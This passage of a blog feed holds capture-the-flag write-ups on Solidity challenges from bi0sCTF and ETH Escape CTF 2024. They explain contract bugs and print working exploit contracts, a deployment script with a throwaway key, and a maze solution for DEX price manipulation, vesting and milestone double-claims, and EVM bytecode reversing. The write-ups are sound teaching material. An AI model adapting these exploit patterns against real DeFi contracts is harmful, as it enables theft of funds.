FLAG&quot;)); usdsEngine.bi0sSwapv1Call(address(this), address(weth), FLAG_HASH + uint160(address(this)), abi.encode(FLAG_HASH)); usdsEngine.bi0sSwapv1Call(address(this), address(safeMoon), FLAG_HASH + uint160(address(this)), abi.encode(FLAG_HASH)); }}contract Solve is Script{ function run() public { vm.startBroadcast(); Setup setup=Setup(vm.envAddress(&quot;SETUP&quot;)); Exploiter exploiter = new Exploiter{value: 80_000 ether}(setup); exploiter.exploit(); vm.stopBroadcast(); }}Transient Heist RevengeThe setup Create WETH/USDC, WETH/SafeMoon, and SafeMoon/USDC pools.The user starts with 80_001e18 WETH.The goal Make the collateral deposited exceed the hash amount.Revenge challThe acceptedToken modifier only checks the collateralToken. With 80,000 WETH, we can obtain a significant amount of SafeMoon tokens. If we can create a contract address with seven leading zeros, we can set tokensSentBack to match the user’s address. After swap, we can send amount - (contract address) to the user vault to set amountOut to the user’s address. Then, by directly calling bi0sSwapv1Call, we can set an arbitrary collateral deposit amount.The exploit requires a vanity contract address, not EOA because we should use transient storage. cast create2 –starts-with “0000000” –init-code-hash “” –deployer “” function bi0sSwapv1Call(address sender,address collateralToken,uint256 amountOut,bytes memory data) external nonReEntrant { uint256 collateralDepositAmount=abi.decode(data,(uint256)); address bi0sSwapPair; assembly{ bi0sSwapPair:=tload(1) } if(msg.sender!=bi0sSwapPair){ revert USDSEngine__Only__bi0sSwapPair__Can__Call(); } if(collateralDepositAmount&amp;gt;amountOut){ revert USDSEngine__Insufficient__Collateral(); } uint256 tokensSentToUserVault=amountOut-collateralDepositAmount; user_vault[sender][collateralToken]+=tokensSentToUserVault; assembly{ tstore(1,tokensSentToUserVault) } collateralDeposited[sender][collateralToken]+=collateralDepositAmount; } Vastavikamania tokenThe setup Deploy three VSTETH token pairs and send some WETH to the balancer contract.The goal Earn over 141.3 ether.Analyze a bitThere were two unintended solutions. The first one is setting the player address to the WETH contract address. function setPlayer(address _player)public{ player=_player; } function isSolved()public view returns (bool){ if(player.balance&amp;lt; 141.3 ether){ return false; } return true; }Another bug is in the takeOffLiquidity function. It incorrectly permits users to withdraw more than their available balance function takeOffLiquidity(address _token,uint256 _amount)external nonReentrant{ uint256 user_balance=tokenBalances[_token][msg.sender]; if(_amount&amp;lt;user_balance){ // @audit-info should use `&amp;gt;` revert Balancer__Insufficient__User__Balance(_amount,user_balance); } IERC20(_token).transfer(msg.sender, _amount); }The intended solution was to borrow all WETH from the balancer and execute a sequence of buyQuote -&amp;gt; addVasthavikamainaLiquidity -&amp;gt; sellQuote functions to generate profit across three pools. After swapping all borrowed WETH for lamboToken, we can add liquidity to a pool with an increased lamboToken price. By providing half of the tokens as liquidity, we can generate additional profit through the increased K value in the pair.function addVasthavikamainaLiquidity(address _vasthavikamainaToken,address _lamboToken,uint256 _loanAmount,uint256 _quoteAmount)external returns(uint256){ if(!_whiteList[_vasthavikamainaToken]){ revert Factory__VasthavikamainaToken__Not_WhiteListed(_vasthavikamainaToken); } address _uniPair=__calculatePoolAddress(_vasthavikamainaToken,_lamboToken); (address _token0,)=__getToken0andToken1(_vasthavikamainaToken,_lamboToken); (uint112 _reserve0,uint112 _reserve1,)=IUniswapV2Pair(_uniPair).getReserves(); uint256 _lamboTokens_To_Transfer; if(_token0==_vasthavikamainaToken){ _lamboTokens_To_Transfer= (_loanAmount*_reserve1)/_reserve0; }else{ _lamboTokens_To_Transfer= (_loanAmount*_reserve0)/_reserve1; } VasthavikamainaToken(_vasthavikamainaToken).takeLoan(_uniPair, _loanAmount); LamboToken(_lamboToken).transferFrom(msg.sender, _uniPair, _lamboTokens_To_Transfer); IUniswapV2Pair(_uniPair).mint(address(1)); emit Factory__LiquidityAdded(_vasthavikamainaToken,_lamboToken,_loanAmount,_lamboTokens_To_Transfer); return _lamboTokens_To_Transfer; }The Time Travellers DEXThe setup The Finance contract has 250,000 ether, 500,000 WETH, and 11,500,000,000 INR.The DEX contract has an LP with 50,000 WETH and 230,000 INR.The goal dex contract should maintain initial supply, but user should extract over 100_000 WETH, 230000 * 100000 INR and 89835 ether with 6 swaps. function solve()external{ address _msgSender=msg.sender; if(IERC20(WETH).balanceOf(_msgSender)&amp;lt; 100_000 ether){ revert Setup_Insufficient_WETH_To_Solve(); }else if(IERC20(INR).balanceOf(_msgSender)&amp;lt; 2_30_000 * 100_000 ether ){ revert Setup_Insufficient_INR_To_Solve(); }else if(_msgSender.balance&amp;lt; 89_835 ether){ revert Setup_Insufficient_ETH_To_Solve(); }else if(dex.reserve0()&amp;lt;WETH_SUPPLIED_BY_LP || dex.reserve1()&amp;lt;INR_SUPPLIED_BY_LP){ revert Setup_Dex_Pool_Ratio_Changed(); }else if(dex.swaps_count()&amp;gt;uint256(6)){ revert Setup_DEX_Swap_Count_Limit_Exceeds(); } solved=true; } Analyze a bitThe finance contract provides functions, stake, withdraw, flashLoan function stake(address _tokenOut)external payable approvedChecker(_tokenOut)returns (uint256){ if(msg.value&amp;lt;MIN_STAKE){ revert FINANCE_Invalid_Stake_Amount(msg.value,MIN_STAKE); } if(_tokenOut==address(WETH)){ Currency(_tokenOut).transfer(msg.sender,msg.value); LatestBalances[address(WETH)]-=msg.value; return msg.value; }else{ (uint256 _wethPriceInInr,)=this.getPrice(); uint256 _tokensToMinted= (msg.value*_wethPriceInInr)/( 2**112); Currency(_tokenOut).transfer(msg.sender,_tokensToMinted); LatestBalances[address(INR)]-=_tokensToMinted; return _tokensToMinted; } }we can stake over 0.5 ether to get WETH or INR. the amount of INR is determined by getPrice function. function withdraw(address _token,uint256 _amount)external nonReentrant approvedChecker(_token){ uint256 _tokensReceived=Currency(_token).balanceOf(address(this))-feesCollected[_token]-LatestBalances[_token]; if(_tokensReceived&amp;lt;_amount){ revert FINANCE_Expected_Amount_Not_Transferred(_amount,_tokensReceived); } LatestBalances[_token]+=_tokensReceived; if(_token==address(WETH)){ (bool success,)=payable(msg.sender).call{value: _tokensReceived}(&quot;&quot;); if(!success){ revert FINANCE_Withdraw_Failed(); } }else{ (uint256 _WethPriceInInr,uint256 _InrPriceInWeth)=this.getPrice(); uint256 _Eth_To_Transfer= ((_InrPriceInWeth* _tokensReceived )/(2**112))+1;//rounding up (bool success,)=payable(msg.sender).call{value: _Eth_To_Transfer}(&quot;&quot;); if(!success){ revert FINANCE_Withdraw_Failed(); } } }The withdraw functions is similar. By sending WETH or INR token, can get back ether, the price determined by getPrice function when withdrawing INR. function timeElapsed() public view returns (uint256 _time) { _time=block.timestamp-lastSnapshotTime; } function snapshot()public{ (uint256 _price0,uint256 _price1,uint256 _lastTimeStamp)=dex.get_Cumulative_Prices(); uint256 time_Elapsed=timeElapsed(); if(time_Elapsed&amp;lt; 1 minutes){ revert FINANCE_Price_Is_Not_Yet_Expired(); } wethPriceCumulative=_price0; inrPriceCumulative=_price1; lastSnapshotTime=_lastTimeStamp; } function getPrice() public view returns (uint256 _wethPrice,uint256 _inrPrice){ uint256 time_Elapsed=timeElapsed(); if(lastSnapshotTime==0){ revert FINANCE_SnapShot_Not_Yet_Taken(); } if(time_Elapsed&amp;gt;= 2 minutes){ revert FINANCE_Price_Is_Expired(); } (uint256 _price0,uint256 _price1,)=dex.get_Cumulative_Prices(); uint256 _timeElapsed= dex.timeStampLast()-lastSnapshotTime; if(_timeElapsed==0){ revert FINANCE_Prices_Not_Update_Since_Last_SnapShot(); } _wethPrice= (_price0-wethPriceCumulative)/_timeElapsed; _inrPrice= (_price1-inrPriceCumulative)/_timeElapsed; }To get price with getPrice function, the snapshot should be called at intervals between one and two minutes. function _update() private { reserve0=uint112(IERC20(token0).balanceOf(address(this))); reserve1=uint112(IERC20(token1).balanceOf(address(this))); uint256 timeElapsed=block.timestamp-timeStampLast; if(timeElapsed&amp;gt;0 &amp;amp;&amp;amp; reserve0&amp;gt;0 &amp;amp;&amp;amp; reserve1&amp;gt;0){ price0CumulativeLast+=uint256(UQ112x112.encode(reserve1).uqdiv(reserve0)*timeElapsed); price1CumulativeLast+=uint256(UQ112x112.encode(reserve0).uqdiv(reserve1)*timeElapsed); } timeStampLast=block.timestamp; }In Dex contract, the price is calculated with current reserves of the tokens, similar to uniswap v2.The bug function skim(address _to) external { IERC20(token0).transfer(_to, IERC20(token0).balanceOf(address(this))-reserve0); IERC20(token0).transfer(_to, IERC20(token1).balanceOf(address(this))-reserve1); }The vulnerability is on skim function, It transfers token0 with token1 diff, not token1. The initial price is set to 1WETH = 230000INR buts the user can swap 1 INR to 1 WETH. well, this is unintended bug. The fundamental bug is that getPrice function does not reflect the price after swap without manual snapshot call.Drain the contractNow we can drain all WETH in DEX contarct. But we should get some balances before function claimBonus1()external{ if(claimed1){ revert Setup_Bonus_Already_Claimed(); } claimed1=true; payable(msg.sender).call{value: userBonus1}(&quot;&quot;); // 12500 ether } function claimBonus2()external { if(claimed2){ revert Setup_Bonus_Already_Claimed(); } if(finance.entered()){ revert Setup_Bonus_Cannot_Be_Claimed_During_Flash_Loan(); } if(IERC20(WETH).balanceOf(msg.sender) &amp;lt;50_000 ether){ revert Setup_Inelgible_For_Bonus_Claim(); } claimed2=true; payable(msg.sender).call{value: userBonus2}(&quot;&quot;); // 10000 ether }In Setup contract, it provides 12500 ether first and then when we have over 50000 WETH, it sends additional 10000 ether.Exploit Claim the initial WETH bonus and stake all received WETH to convert it to INR. Withdraw all WETH from the DEX at a 1:1 INR:WETH ratio. Claim the second Ether bonus after reaching the required WETH balance. Transfer 1 WETH to the DEX to manipulate the swap rate. Swap 1e18 WETH for INR at the manipulated rate, then withdraw most of the INR from the DEX. Send the same amount of INR back to the DEX and transfer 10,000e18 WETH to set the swap rate to 1:10,000. With the manipulated swap rate, withdraw all WETH from the finance contract using some INR, and then withdraw WETH from the DEX again to further increase the WETH price. Withdraw all INR from the finance contract at the manipulated rate, then send INR and WETH to the DEX to restore the initial LP amounts.contract Exploit { Setup setup; DEX dex; Finance finance; address WETH; address INR; receive() external payable {} constructor(Setup _setup) { setup = _setup; dex = setup.dex(); finance = setup.finance(); WETH = setup.WETH(); INR = setup.INR(); } function stage1() external { setup.claimBonus1(); finance.snapshot(); dex.sync(); finance.stake{value: address(this).balance}(WETH); // 1. withdraw all WETH from dex uint256 amount = IERC20(WETH).balanceOf(address(this)); IERC20(WETH).transfer(address(dex), amount); dex.swap(WETH, amount, 0, address(this)); IERC20(INR).transfer(address(dex), IERC20(WETH).balanceOf(address(dex))); dex.skim(address(this)); // 2. claim bonus2 setup.claimBonus2(); IERC20(WETH).transfer(address(dex), 1); finance.snapshot(); dex.sync(); } function stage2() external { // 3. set swap rate 10000:1 IERC20(WETH).transfer(address(dex), 1e18); dex.swap(WETH, 1, 0, address(this)); uint256 gap = IERC20(WETH).balanceOf(address(dex)) - IERC20(INR).balanceOf(address(dex)); IERC20(INR).transfer(address(dex), gap); IERC20(WETH).transfer(address(dex), 10000e18); dex.sync(); } function stage3() external { // 4. withdraw ETH from finance finance.snapshot(); dex.sync(); IERC20(INR).transfer(address(finance), 262473*1e14); finance.withdraw(INR, 0); IERC20(INR).transfer(address(dex), 10000e18 + (1 ether - 1e11)); dex.skim(address(this)); finance.snapshot(); } function stage4() external { // 5. withdraw INR from finance dex.sync(); finance.stake{value: 1.1 ether}(INR); IERC20(WETH).transfer(address(dex), setup.WETH_SUPPLIED_BY_LP()); IERC20(INR).transfer(address(dex), setup.INR_SUPPLIED_BY_LP()); dex.sync(); finance.stake{value: 100_000 ether - IERC20(WETH).balanceOf(address(this))}(WETH); setup.solve(); }}## [...]setup_addr = &quot;0x33f2D286C37bA672562cA96A97e9047C93a10002&quot;pv_key = &quot;0x9f177531d167891c3ade8a6b754393750350f941da78feaaeecf1d678dd14891&quot;rpc_url = &quot;http://rpc.eng.run:8372&quot;env=os.environ.copy()env.update({ &quot;SETUP&quot;: setup_addr})out, err = create(setup_addr, pv_key, rpc_url, env)exploit_addr = out.split(&quot;Deployed to: &quot;)[1].split(&quot;\\n&quot;)[0]print(f&quot;Exploit contract deployed to {exploit_addr}&quot;)time.sleep(60);print(&quot;Stage 1&quot;)out, err = cast_send(exploit_addr, &quot;stage1()&quot;, pv_key, rpc_url, env)time.sleep(5)print(&quot;Stage 2&quot;)out, err = cast_send(exploit_addr, &quot;stage2()&quot;, pv_key, rpc_url, env)time.sleep(60)print(&quot;Stage 3&quot;)out, err = cast_send(exploit_addr, &quot;stage3()&quot;, pv_key, rpc_url, env)time.sleep(5)print(&quot;Stage 4&quot;)out, err = cast_send(exploit_addr, &quot;stage4()&quot;, pv_key, rpc_url, env)## [...]Thanks for reading ! I’d like to make this kind of fun challenge next time :D" }, { "title": "(CTF) ETH Escape CTF 2024 writeup (Feel, Vest, MAZE)", "url": "/posts/(ctf)-2024-eth-escape-ctf/", "categories": "CTF, WEB3", "tags": "writeup, web3", "date": "2024-11-21 02:02:13 +0900", "snippet": "As a member of Project Sekai, I authored 3 challenges. Working with mixy and Immunefi onsite was a very rewarding experience for me. The ETH Escape CTF is hosted by Ethereum Foundation ⚔ immunefi, onsite event during the devcon.https://lu.ma/viyjky8tI authored three challenges: Vest, Feel, and MAZE, designed for the 1st, 5th, and final rounds, respectively. Both Vest and Feel had 0 solves, while MAZE had one solve during the CTF. However, there were two additional solves a few minutes after the CTF ended TㅅTVestround 5, 0 solveThree contract files are given: VestToken, Setup, and Vest. VestToken is an ERC20 token contract with a total supply of 50000 ether. The Setup contract creates the VestToken and Vest contracts. It also transfers 50000 ether worth of tokens to the Vest contract.The goal is to make the token balance of the Setup contract equal to 50000 ether.Vest contractThe Vest contract provides the vesting service. There are three external functions: createVesting, transferVesting, and claimVesting. function createVesting(address beneficiary) external { require(beneficiary != address(0), &quot;Invalid beneficiary address&quot;); require(vestingCount &amp;lt; 10, &quot;Maximum number of vestings reached&quot;); vestings[vestingCount] = Vesting({ start: block.timestamp, totalAmount: FIXED_AMOUNT, claimedAmount: 0, beneficiary: beneficiary, step: 0 }); vestingCount++; emit VestingCreated(vestingCount, beneficiary, FIXED_AMOUNT); }In the createVesting function, it creates a new vesting with vestingCount. FIXED_AMOUNT is 1000 ether. Creating only 10 vestings is allowed. function transferVesting(uint256 vestingId,address newBeneficiary, uint256 amount,uint256 newVestingId) external onlyBeneficiary(vestingId) { require(newBeneficiary != address(0), &quot;New beneficiary is zero address&quot;); address previousBeneficiary = vestings[vestingId].beneficiary; vestings[vestingId].totalAmount -= amount; vestings[vestingId].step = 0; vestings[newVestingId] = Vesting({ start: block.timestamp, totalAmount: amount, claimedAmount: 0, beneficiary: newBeneficiary, step: 0 }); emit VestingTransferred(vestingId, previousBeneficiary, newBeneficiary); }There’s a bug in the transferVesting function. It decreases totalAmount by the amount to send and initializes the step. After that, it creates a new vesting with newVestingId for that amount with a new beneficiary.The bugs: newVestingId can be an existing vestingId, but there is no way to drain or bypass the restriction with this bug. If misused, this bug allows overwriting an existing vesting with a smaller amount. The function does not check the claimAmount of the previous vesting. As a result, a user can send an already claimed vesting to themselves again. With totalAmount, the user can create vestings again without increasing vestingCount.So, the user can claim more than 10000 ether. However, as mentioned in the description, there is a time limit for this challenge. function claimVesting(uint256 vestingId) external onlyBeneficiary(vestingId) { Vesting storage vesting = vestings[vestingId]; uint256 elapsed = block.timestamp - vesting.start; uint256 totalSteps = TOTAL_STEPS - vesting.step; uint256 availableSteps = elapsed / CLAIM_INTERVAL; if (availableSteps &amp;gt; totalSteps) { availableSteps = totalSteps; } uint256 claimableAmount = (vesting.totalAmount * availableSteps) / totalSteps; uint256 claimableNow = claimableAmount - vesting.claimedAmount; require(claimableNow &amp;gt; 0, &quot;No tokens available for claim at this time&quot;); vesting.claimedAmount += claimableNow; require(token.transfer(vesting.beneficiary, claimableNow), &quot;Token transfer failed&quot;); emit Claimed(vestingId, claimableNow); }Let’s look at the claimVesting function. TOTAL_STEPS is 5*5, and CLAIM_INTERVAL is 5. This means the user must wait 25 seconds to claim the totalAmount of the vesting. Since 10 vestings can be created at once, the user can claim 10000 ether every 25 seconds. To claim the totalSupply, the user must wait at least 125 seconds. How doable!Exploit// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.0;import {Script, console} from &quot;forge-std/Script.sol&quot;;import {Setup} from &quot;src/challenge/Setup.sol&quot;;import {Vest} from &quot;src/challenge/Vest.sol&quot;;import {VestToken} from &quot;src/challenge/VestToken.sol&quot;;contract Exploit { Setup public setup; Vest public vest; VestToken public token; constructor(Setup _setup, Vest _vest, VestToken _token) { setup = _setup; vest = _vest; token = _token; } function run1() public { for(uint i=0;i&amp;lt;10;i++){ vest.createVesting(address(this)); } } function run2() public returns (uint256) { for(uint i=0;i&amp;lt;10;i++){ vest.claimVesting(i); vest.transferVesting(i, address(address(this)), 1000 ether, i); } return token.balanceOf(address(this)); } function run3() public { token.transfer(address(setup), token.balanceOf(address(this))); }}This is exploit contract and the exploit scenario is as follows: Create 10 vestings. Claim the 10 vestings after 25 seconds and transfer the vestings to itself. Repeat step 2 five times. Send the token amount of 50000 ether to the setup contract.NOTEI believe this challenge was pretty easy, but the time for each round was too short (two challenges in 60 minutes).In the original version, the function reverts when the vesting is completed (claimable amount is 1000 ether), and TOTAL_STEPS and CLAIM_INTERVAL were significantly longer. The exploit required almost 10 minutes, which often led to server timeouts. This meant I had to write a fully accurate script, including fetching RPC info, precise sleep timings, and more, to exploit successfully.Feelround 1, 0 solveAlso, three contract files are given: Feel, FeelToken, and Setup. FeelToken is an ERC20 token contract with a totalSupply of 20 ether. The Setup contract creates the Feel and FeelToken contracts and sends 20 ether worth of FeelToken to the Feel contract.The goal is to make the token balance of the Setup contract equal to 20 ether.Feel contractThe Feel contract provides milestone service, which is similar to Vest challenge. function addMilestone(uint256 id, string calldata note) public { require(milestones[id].id == 0, &quot;Feel: milestone id already exists&quot;); require(id &amp;gt; 0, &quot;Feel: milestone id must be greater than 0&quot;); require(milestoneCount &amp;lt; 10, &quot;Feel: maximum 10 milestones allowed&quot;); milestones[id] = Milestone(id, 1 ether, block.timestamp + 5 minutes, msg.sender, note, Status.Locked); milestoneCount++; }Let’s first look at the addMilestone function. The user can specify an id that does not exist previously, and the maximum number of milestones is limited to 10. struct Milestone { uint256 id; uint256 amount; uint256 unlockTime; address recipient; string note; Status status; }The Milestone struct has six members. The user can only specify the id and note. They can earn 1 ether for completing one milestone. function unlockMilestone(uint256 id) public { Milestone storage milestone = milestones[id]; require(milestone.status == Status.Locked, &quot;Feel: milestone is already unlocked&quot;); require(block.timestamp &amp;gt;= milestone.unlockTime, &quot;Feel: milestone is not unlocked yet&quot;); milestone.status = Status.Unlocked; }The user can unlock a milestone after 5 minutes (default). function claimMilestone(uint256 id) public { Milestone storage milestone = milestones[id]; require(milestone.status == Status.Unlocked, &quot;Feel: milestone is locked&quot;); uint256 milestones_slot_key = uint256(keccak256(abi.encode(id, MILESTONES_SLOT_KEY))); bytes32 note_key = bytes32(milestones_slot_key + 4); uint256 string_length = StorageSlot.getUint256Slot(note_key).value; bytes memory note_bytes; if (string_length &amp;amp; 0x1 == 0) { uint256 length = (string_length&amp;amp;0xff) &amp;gt;&amp;gt; 1; bytes32 note_bytes32 = StorageSlot.getBytes32Slot(note_key).value; note_bytes = abi.encodePacked(note_bytes32); } else { uint256 length = (string_length &amp;gt;&amp;gt; 1) -1; uint256 extra_slots = (length + 31) &amp;gt;&amp;gt; 5; uint256 extra_slots_start = uint256(keccak256(abi.encode(note_key))); note_bytes; for (uint256 i = 0; i &amp;lt; extra_slots; i++) { note_bytes = abi.encodePacked(note_bytes, StorageSlot.getBytes32Slot(bytes32(extra_slots_start + i)).value); } } require(findClaimString(note_bytes) == false, &quot;Feel: milestone is already claimed&quot;); milestone.note = string(abi.encodePacked(milestone.note, &quot; [CLAIMED]&quot;)); token.transfer(milestone.recipient, milestone.amount); milestoneCount -= 1; }The user can claim a milestone with claimMilestone when its status is Unlocked. However, there’s a strange check for this condition.First, it retrieves the storage value in the note of the milestone and checks if the first bit is set. In particular: if the data is at most 31 bytes long, the elements are stored in the higher-order bytes (left aligned) and the lowest-order byte stores the value length * 2. For byte arrays that store data which is 32 or more bytes long, the main slot p stores length * 2 + 1 and the data is stored as usual in keccak256(p). This means that you can distinguish a short array from a long array by checking if the lowest bit is set: short (not set) and long (set).If the length of the note is less than 32 bytes, it retrieves 32 bytes from storage directly. Otherwise, it calculates how many slots to retrieve based on the length of the string and then retrieves the entire string. It then checks for the presence of the [CLAIMED] substring in the note. The findClaimString function, created with GPT, has no bugs for this functionality :3If the string [CLAIMED] is not found, the function appends the string to the note, sends the token to the user, and decreases milestoneCount by 1. This allows the possibility of creating a new milestone after claiming a milestone. However, the server timeout is 9 minutesThe bugs: The note_bytes32 includes the length of the note, not just the data. However, this doesn’t affect the outcome in this challenge. The length is calculated incorrectly using (string_length &amp;gt;&amp;gt; 1) - 1 instead of the correct formula (string_length - 1) &amp;gt;&amp;gt; 1. As a result, the length is calculated as one less than the original length. This becomes problematic when the length is 32*n + 1, especially 33. In this case, the length is calculated as 32, and the extra_slots is calculated as 1. Consequently, one less slot is retrieved. If the length of the note after appending the [CLAIMED] string becomes 32*n + 1, the last character ] is missed, allowing the milestone to be claimed twice.Exploit// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.0;import {Script, console} from &quot;forge-std/Script.sol&quot;;import {Setup} from &quot;src/challenge/Setup.sol&quot;;import {Feel} from &quot;src/challenge/Feel.sol&quot;;import {FeelToken} from &quot;src/challenge/FeelToken.sol&quot;;contract ExploitScript is Script { function run() public { vm.startBroadcast(); Setup setup = Setup(vm.envAddress(&quot;SETUP&quot;)); Feel feel = Feel(setup.feel()); FeelToken token = FeelToken(setup.token()); console.log(&quot;timestamp 1&quot;, feel.getTime()); for(uint i=1;i&amp;lt;=10;i++){ feel.addMilestone(i,&quot;xxxxxxxxxxxxxxxxxxxxxxx&quot;); } vm.stopBroadcast(); } function run2() public { vm.startBroadcast(); Setup setup = Setup(vm.envAddress(&quot;SETUP&quot;)); Feel feel = Feel(setup.feel()); console.log(&quot;timestamp 2&quot;, feel.getTime()); FeelToken token = FeelToken(setup.token()); for(uint i=1;i&amp;lt;=10;i++){ feel.unlockMilestone(i); feel.claimMilestone(i); feel.addMilestone(i+50,&quot;xxxxxxxxxxxxxxxxxxxxxxx&quot;); feel.claimMilestone(i); } console.log(&quot;balance: &quot;, token.balanceOf(msg.sender)); token.transfer(address(setup), token.balanceOf(msg.sender)); vm.stopBroadcast(); }}The exploit scenario is: Add 10 milestones with notes of length 23 (after appending [CLAIMED], the length will become 33). Wait 5 minutes to unlock the milestones, claim a milestone, and add some milestones to prevent underflow. Then, claim the same milestone again.NOTEThis challenge is also inspired by a real-world case. lolMAZEfinal, 1 solveThe only one file was given. Setup.solpragma solidity ^0.8.25;contract Setup { address public maze; constructor() { bytes memory code = hex&quot;61025e80600a3d393df35f3560e01c63deadbeef146100135761001c565b5f545f5260205ff35b7f41327924f1b91fe820120120804b93f9248e3926010092082080000036fbefb85f527f8c4f3a002402480003238db6237239920124124120b1db1249271c64120924006020527f24904920be1b9249246fa082092492003238e493c6fc9900120804824b7e47e46040527ff9fb9ff9dc9804020920904b927ee49249da0804004920131c9230c30c4990486060527f260920100904132493f7230df1904804120804c7e3fe7fe3e2640200000008316080527f4000b7279ff93bee64100000820831f11bf1c93ce804920104800ced89e7718f60a0526a013feff7ff7ffe8008040060c052610232610140525f610100525b6101005180361461024557600190610120376101205160f81c80607714610149578060611461018857806073146101c75780606414610206575b6101006031610140510361065090068080929004602002519061010090061c6001901660011461025c576101405250610100516001016101005261010f565b6101006001610140510361065090068080929004602002519061010090061c6001901660011461025c576101405250610100516001016101005261010f565b6101006031610140510161065090068080929004602002519061010090061c6001901660011461025c576101405250610100516001016101005261010f565b6101006001610140510161065090068080929004602002519061010090061c6001901660011461025c576101405250610100516001016101005261010f565b6101405161064f146102565761025c565b60015f55005b00&quot;; address _maze; assembly { _maze := create(0, add(code, 0x20), mload(code)) } maze = _maze; } function isSolved() public returns (bool) { (bool success, bytes memory result) = maze.call(hex&quot;DEADBEEF&quot;); uint256 ret = abi.decode(result, (uint256)); if(ret == 0x1) { return true; } return false; }}When the Setup contract calls the maze contract with DEADBEEF as calldata, it should return uint256(1).bytecode reversing with decompilerfunction __function_selector__() private { if (0xdeadbeef == msg.data[0] &amp;gt;&amp;gt; 224) { CodeIsLawZ95677371(); } else { MEM[0] = 0x41327924f1b91fe820120120804b93f9248e3926010092082080000036fbefb8; MEM[32] = 0x8c4f3a002402480003238db6237239920124124120b1db1249271c6412092400; MEM[96] = 0xf9fb9ff9dc9804020920904b927ee49249da0804004920131c9230c30c499048; MEM[128] = 0x260920100904132493f7230df1904804120804c7e3fe7fe3e264020000000831; MEM[160] = 0x4000b7279ff93bee64100000820831f11bf1c93ce804920104800ced89e7718f; MEM[192] = 0x13feff7ff7ffe80080400] MEM[320] = 562; while (msg.data.length != 0) { CALLDATACOPY(288, 0, 1); if (119 != MEM[288] &amp;gt;&amp;gt; 248) { if (97 == MEM[288] &amp;gt;&amp;gt; 248) { if (1 != MEM[(MEM[320] - 1) % 1616 &amp;gt;&amp;gt; 8 &amp;lt;&amp;lt; 5] &amp;gt;&amp;gt; (MEM[320] - 1) % 1616 % (uint8.max + 1) &amp;amp; 0x1) { MEM[320] = (MEM[320] - 1) % 1616; MEM[uint8.max + 1] += 1; } } else if (115 == MEM[288] &amp;gt;&amp;gt; 248) { if (1 != MEM[(MEM[320] + 49) % 1616 &amp;gt;&amp;gt; 8 &amp;lt;&amp;lt; 5] &amp;gt;&amp;gt; (MEM[320] + 49) % 1616 % (uint8.max + 1) &amp;amp; 0x1) { MEM[320] = (MEM[320] + 49) % 1616; MEM[uint8.max + 1] += 1; } } else if (100 == MEM[288] &amp;gt;&amp;gt; 248) { if (1 != MEM[(MEM[320] + 1) % 1616 &amp;gt;&amp;gt; 8 &amp;lt;&amp;lt; 5] &amp;gt;&amp;gt; (MEM[320] + 1) % 1616 % (uint8.max + 1) &amp;amp; 0x1) { MEM[320] = (MEM[320] + 1) % 1616; MEM[uint8.max + 1] += 1; } } } if (1 != MEM[(MEM[320] - 49) % 1616 &amp;gt;&amp;gt; 8 &amp;lt;&amp;lt; 5] &amp;gt;&amp;gt; (MEM[320] - 49) % 1616 % (uint8.max + 1) &amp;amp; 0x1) { MEM[320] = (MEM[320] - 49) % 1616; MEM[uint8.max + 1] += 1; } } exit; if (1615 == MEM[320]) { _codeIsLawZ95677371 = 1; exit; } }}First, we can decompile the bytecode using the Dedaub decompiler. However, the output seems quite different from what I expected, probably because I wrote this bytecode in Huff and used stack variables efficiently (ig).As you can see, the map data is stored in 0x00 ~ 0xc0, but 0x40 is missing in the decompiler. The initial position is stored in MEM[320] (562 = 11 * 49 + 23 = [11][23]). The loop iterates based on the length of the msg.data, and MEM[uint8.max + 1] (MEM[0x100]) is used as the iterator.It checks if the bit in the new location is set according to the map. The size of a row is 49, and it should approach 1615 ([34][47]).bytecode reversing with bytegraph.xyzI prefer using bytegraph.xyz for analyzing bytecode.It returns the value of slot 0 when the calldata is DEADBEEF.It stores map data in 0x00 ~ 0xc0, position to 0x140 and iterator(0) to 0x100The loop iterates until iterator reaches the calldatasize, and if the position equals 0x64f after the loop, it stores 1 in slot 0.The user input can be one of the following: w, a, s, or d. I just realized a mistake: in other cases, it simply jumps to w instead of stopping, haha..There are six red boxes. Let’s examine the case of w: It calculates the next position by subtracting 0x31 (the size of a row). (w -&amp;gt; -0x31, s -&amp;gt; +0x31, a -&amp;gt; -1, d -&amp;gt; +1). It performs a modulo operation with 0x650. This is a bug because the position can be a negative value. If it is moduloed with 0x650, it can jump to another location. For example, when the new position is -1 (0xff...), the result of the modulo with 0x650 will be 0x60F (((1 &amp;lt;&amp;lt; 256) - 1) % 0x650). It divides the position by 0x100 and multiplies the result by 0x20 to determine the map to use. It performs a modulo operation with 0x100 on the position and shifts the map to the right by that value to locate the corresponding bit. It performs an AND operation with 1 to check the value of that bit. If the result is 1, the EVM stops.Finally, it updates the location and increases the iterator.The mazemaze = [0x41327924f1b91fe820120120804b93f9248e3926010092082080000036fbefb8,0x8c4f3a002402480003238db6237239920124124120b1db1249271c6412092400,0x24904920be1b9249246fa082092492003238e493c6fc9900120804824b7e47e4,0xf9fb9ff9dc9804020920904b927ee49249da0804004920131c9230c30c499048,0x260920100904132493f7230df1904804120804c7e3fe7fe3e264020000000831,0x4000b7279ff93bee64100000820831f11bf1c93ce804920104800ced89e7718f,0x13feff7ff7ffe80080400]maze = [format(x,&#39;0256b&#39;)[::-1] for x in maze]maze = [list(x) for x in maze]maze = sum(maze,[])for i in range(0, 33): for j in range(0, 49): if i == 11 and j == 23: print(&#39;S&#39;,end=&#39;&#39;) elif maze[i*49+j] == &#39;1&#39;: print(&#39;#&#39;,end=&#39;&#39;) else: print(&#39;.&#39;,end=&#39;&#39;) print()You can print the maze using the code above.The S marks the starting point. If you try to find a way to reach the goal location, there will be no solution because I intentionally blocked the path to get there.The intended solution is going to 0x00, setting the new position to -1, and then jumping to 0x60F to escape the maze. However, there was an unintended solution that I couldn’t block. Additionally, there’s another method: reaching the location marked with a star also allows escaping the maze. aaawwwwwwaaaaaaaaaawwaaaaaawwaaaawawwddddddssdddddddddsSo, this was the intended solution.NOTEI really enjoy bytecode reversing or EVM internal challenges :3. Recently, I solved a bytecode challenge in SCTF and also authored a fun bytecode challenge for a local CTF final. If anyone is interested, feel free to DM meAdditionally, I made an easier version for Project Sekai CTF. It’s not bytecode reversing but a Solidity assembly challenge. If you’re interested, give it a try!LinkI was happy that many people especially enjoyed this challenge lolENDkudos to immunefi, ethereum foundation and mixy. I had very nice weekend during the devcon. Hope to do this kind of event onsite again!" }, { "title": "(CTF) blazCTF 2024 writeup (Chisel as a Service, 